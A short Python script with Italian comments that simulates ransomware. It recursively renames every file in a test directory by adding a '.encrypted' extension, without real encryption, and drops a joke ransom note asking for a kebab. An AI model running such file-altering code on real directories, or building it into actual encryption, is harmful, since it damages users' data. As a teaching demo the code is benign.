import os

def simulate_ransomware(directory):
    # Estensione per file "crittografati"
    encrypted_extension = ".encrypted"
    ransom_message = "Per riavere i file dovrai pagarmi un kebab :P"

    # Itera su tutti i file nella directory
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            # Aggiunge una nuova estensione per simulare la crittografia
            os.rename(file_path, file_path + encrypted_extension)
            print(f"File {file} simulato come crittografato (rinominato a {file + encrypted_extension})")
            
    # Crea un file di riscatto
    ransom_file_path = os.path.join(directory, "README.txt")
    with open(ransom_file_path, 'w') as ransom_file:
        ransom_file.write(ransom_message)
    print(f"File di riscatto creato come {ransom_file_path}")

# Esegui la simulazione su una directory di test
test_directory = "C:\\Test"
simulate_ransomware(test_directory)
